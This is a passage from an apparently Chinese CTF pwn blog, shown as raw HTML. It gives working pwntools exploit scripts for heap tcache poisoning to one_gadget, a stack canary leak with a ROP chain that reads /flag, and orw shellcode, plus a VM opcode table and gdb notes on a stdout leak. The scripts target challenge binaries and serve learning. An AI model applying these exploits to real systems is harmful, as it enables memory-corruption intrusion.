class="string">b&quot;&gt;&gt;&quot;</span></span><br><span class="line">move = <span class="string">b&quot;sdddssssssddddsssdsssssdsdddddsdddsssssdddssdsssddddsddsdddsddsssdssddsssssdsdsssssssssssssdddssssdsssssssddssdsssddddsdsssssdsdddsssssdssdsdddddssdssssdssdsdssssdssdddddddddddssddssssdddsdddssdsssdsddsdddddsdsdddddsssddsdddsdsdddddddssddssddddsdddddddsddd&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Enter name (up to 24 chars):&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;New name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>(<span class="params">pay</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Game started! (WASD to move, Q to quit)&quot;</span>,pay)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;dada&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;adad&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">##1.通过游戏 get libc_base</span></span><br><span class="line">game(move)</span><br><span class="line">read = l64()</span><br><span class="line">sl(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;read&#x27;</span>,read)</span><br><span class="line">libc_base = read - <span class="number">0x10e1e0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">one = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">og = libc_base + one[<span class="number">1</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;og&#x27;</span>,og)</span><br><span class="line"><span class="comment">##2. 填充tcache</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">##3.覆写chunk0的fd指针的低字节，概率1/16指向目标地址</span></span><br><span class="line">mo = <span class="string">b&quot;sssssssasssaasssddssdsssddssddddddwdddddddsdddwdwdddwddddwdddwwwwwwwwwwdwwawaaaaasaaaaaaawawaaaaawaw&quot;</span></span><br><span class="line">game(mo)</span><br><span class="line">sl(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#tcache_poisoning</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;aa&#x27;</span>+p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;le0n&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;le0n&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(og))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book_manager"></a>book_manager</h2><p>推测book的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">char</span> title[<span class="number">52</span>];</span><br><span class="line">    <span class="type">uint64_t</span>  title_len;</span><br><span class="line">    <span class="type">char</span> author[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint64_t</span> author_len;</span><br><span class="line">    <span class="type">char</span> pulisher[<span class="number">40</span>];</span><br><span class="line">    <span class="type">uint64_t</span> publisher_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态编译的程序，用sig恢复部分符号表，是一个菜单题通过数组模拟了malloc等</p>
<p>思路：</p>
<p>仔细观察可以发现，所有与book有关的操作都是通过栈来执行的，猜测栈溢出，通过程序中文件读的特点实现load(&#x2F;flag)</p>
<ul>
<li>泄露canary，在search的2中有一个封装的read()的输入函数<code>sub_40206A</code>，在最后可以多覆盖一个字节加上<code>\n</code>，就可以通过printf()来泄露canary</li>
<li>在5中发现了从bss段上copy数据到栈上</li>
<li>填充一些垃圾数据，到canary出构造rop</li>
<li>最终可以将flag读出来</li>
</ul>
<p><img data-src="/../images/image-20250510172410176.png" alt="image-20250510172410176"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-09 16:52:42</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">23000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x4e9b2d</span></span><br><span class="line">load = <span class="number">0x40340C</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401a42</span></span><br><span class="line">ret = <span class="number">0x0000000000401a43</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_book</span>(<span class="params">title, author, publisher</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Title&#x27;</span>, title)</span><br><span class="line">    sa(<span class="string">b&#x27;Author&#x27;</span>, author)</span><br><span class="line">    sa(<span class="string">b&#x27;Publisher&#x27;</span>, publisher)</span><br><span class="line">    log.debug(<span class="string">f&quot;已添加书籍: <span class="subst">&#123;title[:<span class="number">10</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>) </span><br><span class="line">sla(<span class="string">b&#x27;choose&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">sla(<span class="string">b&#x27;name&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>)  </span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line">canary_data = p.recv(<span class="number">7</span>)</span><br><span class="line">canary = u64(canary_data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(flag_addr) + p64(load)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add_book(<span class="string">b&#x27;a&#x27;</span> * <span class="number">50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span>)</span><br><span class="line">add_book(<span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">add_book(payload, <span class="string">b&#x27;b&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;\x00/flag\x00\x00\x00\x00&#x27;</span>, <span class="string">b&#x27;c&#x27;</span> * <span class="number">40</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)  </span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="mini-pwn"><a href="#mini-pwn" class="headerlink" title="mini_pwn"></a>mini_pwn</h2><p>以下是整理后的虚拟机指令集表格：</p>
<hr>
<h3 id="虚拟机指令集表格"><a href="#虚拟机指令集表格" class="headerlink" title="虚拟机指令集表格"></a><strong>虚拟机指令集表格</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>指令名称</strong></th>
<th align="center"><strong>操作码</strong></th>
<th align="center"><strong>子操作码</strong></th>
<th align="center"><strong>目标寄存器</strong></th>
<th align="center"><strong>行为描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>mov reg,[mem]</strong></td>
<td align="center"><code>0x01</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器A，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器B，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器C，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器D，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器E，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到寄存器F，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">从内存地址<code>[SP]</code>读取8字节到SP寄存器，SP +&#x3D; 8</td>
</tr>
<tr>
<td align="center"><strong>mov [mem], reg</strong></td>
<td align="center"><code>0x02</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">将寄存器A的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">将寄存器B的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">将寄存器C的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">将寄存器D的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">将寄存器E的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">将寄存器F的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">将SP寄存器的值写入内存地址<code>[SP-8]</code>，SP -&#x3D; 8</td>
</tr>
<tr>
<td align="center"><strong>swapctx</strong></td>
<td align="center"><code>0x03</code></td>
<td align="center">无</td>
<td align="center">无</td>
<td align="center">保存当前寄存器状态到内存块，并恢复另一上下文（协程&#x2F;异常处理）</td>
</tr>
<tr>
<td align="center"><strong>restorectx</strong></td>
<td align="center"><code>0x04</code></td>
<td align="center">无</td>
<td align="center">无</td>
<td align="center">从内存中恢复之前保存的寄存器状态（与<code>swapctx</code>配对使用）</td>
</tr>
<tr>
<td align="center"><strong>syscall</strong></td>
<td align="center"><code>0x05</code></td>
<td align="center">无</td>
<td align="center">无</td>
<td align="center">执行Linux <code>syscall</code>，参数通过寄存器传递（A&#x3D;系统调用号，B&#x2F;C&#x2F;D&#x3D;参数）</td>
</tr>
<tr>
<td align="center"><strong>xor reg, reg</strong></td>
<td align="center"><code>0x06</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">将寄存器A置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">将寄存器B置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">将寄存器C置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">将寄存器D置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">将寄存器E置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">将寄存器F置零</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">将SP寄存器置零</td>
</tr>
<tr>
<td align="center"><strong>add reg, 8</strong></td>
<td align="center"><code>0x07</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">寄存器A的值增加8（<code>A += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">寄存器B的值增加8（<code>B += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">寄存器C的值增加8（<code>C += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">寄存器D的值增加8（<code>D += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">寄存器E的值增加8（<code>E += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">寄存器F的值增加8（<code>F += 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">SP寄存器的值增加8（<code>SP += 8</code>）</td>
</tr>
<tr>
<td align="center"><strong>sub reg, 8</strong></td>
<td align="center"><code>0x08</code></td>
<td align="center"><code>0x00</code></td>
<td align="center">A</td>
<td align="center">寄存器A的值减少8（<code>A -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x01</code></td>
<td align="center">B</td>
<td align="center">寄存器B的值减少8（<code>B -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x02</code></td>
<td align="center">C</td>
<td align="center">寄存器C的值减少8（<code>C -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x03</code></td>
<td align="center">D</td>
<td align="center">寄存器D的值减少8（<code>D -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x04</code></td>
<td align="center">E</td>
<td align="center">寄存器E的值减少8（<code>E -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x05</code></td>
<td align="center">F</td>
<td align="center">寄存器F的值减少8（<code>F -= 8</code>）</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"><code>0x06</code></td>
<td align="center">SP</td>
<td align="center">SP寄存器的值减少8（<code>SP -= 8</code>）</td>
</tr>
</tbody></table>
<h3 id="关键寄存器说明"><a href="#关键寄存器说明" class="headerlink" title="关键寄存器说明"></a><strong>关键寄存器说明</strong></h3><p>虚拟寄存器组</p>
<ul>
<li><code>A</code>: <code>xmmword_4080</code></li>
<li><code>B</code>: <code>xmmword_4080</code>的高8字节</li>
<li><code>C</code>: <code>xmmword_4090</code></li>
<li><code>D</code>: <code>xmmword_4090</code>的高8字节</li>
<li><code>E</code>: <code>xmmword_40A0</code></li>
<li><code>F</code>: <code>xmmword_40B0</code>的高8字节</li>
</ul>
<p>栈指针</p>
<ul>
<li><code>SP</code>: <code>xmmword_40B0</code>，操作内存时自动增减。</li>
</ul>
<p>状态标志</p>
<ul>
<li><code>qword_40C0</code>：用于控制上下文切换和系统调用的条件。</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow</title>
    <url>/2025/04/27/ctfshow/</url>
    <content><![CDATA[<h1 id="pwn70-不可见字符"><a href="#pwn70-不可见字符" class="headerlink" title="pwn70 不可见字符"></a>pwn70 不可见字符</h1><p>orw + 不可见字符绕过strlen()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">orw = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00\x10&#x27;</span>+orw <span class="comment"># \x10 是换行符</span></span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>不可打印字符（non-printable characters）是指在计算机字符集中不对应于可见符号或图形的字符。这些字符通常用于控制文本的格式、流控制、数据结构或者是特殊的功能，而不是直接表示人类可读的内容。</p>
<h2 id="1-不可打印字符的分类"><a href="#1-不可打印字符的分类" class="headerlink" title="1. 不可打印字符的分类"></a>1. 不可打印字符的分类</h2><p>不可打印字符通常可以分为以下几类：</p>
<ul>
<li><p><strong>控制字符</strong>：这些字符用于控制设备（如打印机或终端）的行为。例如：</p>
<ul>
<li><strong>换行（Line Feed, LF）</strong>：<code>\n</code>（ASCII 10），用于换行。</li>
<li><strong>回车（Carriage Return, CR）</strong>：<code>\r</code>（ASCII 13），用于返回到行首。</li>
<li><strong>制表符（Tab）</strong>：<code>\t</code>（ASCII 9），用于插入水平制表。</li>
<li><strong>警告音（Bell）</strong>：<code>\a</code>（ASCII 7），用于发出声音提示。</li>
</ul>
</li>
<li><p><strong>终止字符</strong>：如 <code>null</code> 字符 <code>\0</code>（ASCII 0），常用于标记字符串的结束。</p>
</li>
<li><p><strong>特殊控制字符</strong>：如 <code>ESC</code>（ASCII 27），用于引入控制序列。</p>
</li>
</ul>
<h2 id="2-不可打印字符的ASCII码"><a href="#2-不可打印字符的ASCII码" class="headerlink" title="2. 不可打印字符的ASCII码"></a>2. 不可打印字符的ASCII码</h2><p>以下是一些常见的不可打印字符及其对应的 ASCII 码：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
<th>ASCII 码</th>
</tr>
</thead>
<tbody><tr>
<td><code>NUL</code></td>
<td>空字符（null）</td>
<td>0</td>
</tr>
<tr>
<td><code>SOH</code></td>
<td>标题开始</td>
<td>1</td>
</tr>
<tr>
<td><code>STX</code></td>
<td>正文开始</td>
<td>2</td>
</tr>
<tr>
<td><code>ETX</code></td>
<td>正文结束</td>
<td>3</td>
</tr>
<tr>
<td><code>EOT</code></td>
<td>传输结束</td>
<td>4</td>
</tr>
<tr>
<td><code>ENQ</code></td>
<td>请求</td>
<td>5</td>
</tr>
<tr>
<td><code>ACK</code></td>
<td>确认</td>
<td>6</td>
</tr>
<tr>
<td><code>BEL</code></td>
<td>响铃</td>
<td>7</td>
</tr>
<tr>
<td><code>BS</code></td>
<td>退格</td>
<td>8</td>
</tr>
<tr>
<td><code>HT</code></td>
<td>水平制表符</td>
<td>9</td>
</tr>
<tr>
<td><code>LF</code></td>
<td>换行</td>
<td>10</td>
</tr>
<tr>
<td><code>VT</code></td>
<td>垂直制表符</td>
<td>11</td>
</tr>
<tr>
<td><code>FF</code></td>
<td>换页</td>
<td>12</td>
</tr>
<tr>
<td><code>CR</code></td>
<td>回车</td>
<td>13</td>
</tr>
<tr>
<td><code>SO</code></td>
<td>转换为旁路</td>
<td>14</td>
</tr>
<tr>
<td><code>SI</code></td>
<td>转换为内部</td>
<td>15</td>
</tr>
<tr>
<td><code>ESC</code></td>
<td>转义</td>
<td>27</td>
</tr>
<tr>
<td><code>DEL</code></td>
<td>删除</td>
<td>127</td>
</tr>
</tbody></table>
<h2 id="3-应用场景"><a href="#3-应用场景" class="headerlink" title="3. 应用场景"></a>3. 应用场景</h2><p>不可打印字符在计算机编程和文本处理中的应用非常广泛，包括但不限于：</p>
<ul>
<li><strong>文本格式和控制</strong>：在终端或打印机输出时，控制字符用来格式化输出。</li>
<li><strong>数据结构</strong>：在某些数据结构中，特定的字符可能被用作分隔符或结束符。</li>
<li><strong>协议设计</strong>：在网络通信协议中，不可打印字符可能用于标记消息的开始和结束，或者表示特定的控制信息。</li>
</ul>
<p><strong>不可打印字符在安全中的作用</strong></p>
<p>在安全场景中，不可打印字符经常被用作绕过过滤器和检查的手段。例如：</p>
<ul>
<li><strong>缓冲区溢出攻击</strong>：攻击者可能会插入不可打印字符，以欺骗安全检查并执行恶意代码。</li>
<li><strong>注入攻击</strong>：在某些情况下，攻击者可能会通过注入不可打印字符来操纵输入，绕过输入验证。</li>
</ul>
<h1 id="pwn162"><a href="#pwn162" class="headerlink" title="pwn162"></a>pwn162</h1><p>有些东西在早些版本是有缺陷的？</p>
<ul>
<li>远程环境：Ubuntu 16.04</li>
</ul>
<p>思路：</p>
<p>首先明确在free时，程序会在free的chunk的fd处写0，并且show()函数无用所以要打stdout</p>
<ul>
<li>利用unsortedbin的特性在chunk上留下libc地址（通过chunk shrink)，该chunk称chunk A</li>
<li>利用程序的特性，<strong>部分覆盖</strong>使其1&#x2F;16指向_IO_2_1_stdout_附近</li>
<li>fastbin_dup(<strong>partial write</strong>)使chunk A链入fastbin那么stdout附近的那个chunk(B)就也被链入了fastbin</li>
<li>申请出chunk B修改stdout的flag-&gt;0xfbad1800 和 write_base的低位 -&gt; \x00，并计算地址</li>
<li>用realloc调整栈帧使one_gadget成立</li>
</ul>
<blockquote>
<p>为什么覆盖libc地址的低2字节为b”\xdd\x25”？</p>
</blockquote>
<p>在gdb中查看_IO_list_all的地址，可以看到stdout，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p (void*)_IO_list_all</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x7f8fe0a6b540 &lt;_IO_2_1_stderr_&gt;</span><br><span class="line">pwndbg&gt; p/x &amp;_IO_list_all</span><br><span class="line"><span class="variable">$2</span> = 0x7f8fe0a6b520</span><br><span class="line">pwndbg&gt; x/20gx 0x7f8fe0a6b520</span><br><span class="line">0x7f8fe0a6b520 &lt;_IO_list_all&gt;:  0x00007f8fe0a6b540      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b530: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b540 &lt;_IO_2_1_stderr_&gt;:       0x00000000fbad2086      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b550 &lt;_IO_2_1_stderr_+16&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b560 &lt;_IO_2_1_stderr_+32&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b570 &lt;_IO_2_1_stderr_+48&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b580 &lt;_IO_2_1_stderr_+64&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b590 &lt;_IO_2_1_stderr_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5a0 &lt;_IO_2_1_stderr_+96&gt;:    0x0000000000000000      0x00007f8fe0a6b620</span><br><span class="line">0x7f8fe0a6b5b0 &lt;_IO_2_1_stderr_+112&gt;:   0x0000000000000002      0xffffffffffffffff</span><br><span class="line">pwndbg&gt;</span><br><span class="line">0x7f8fe0a6b5c0 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000      0x00007f8fe0a6c770</span><br><span class="line">0x7f8fe0a6b5d0 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff      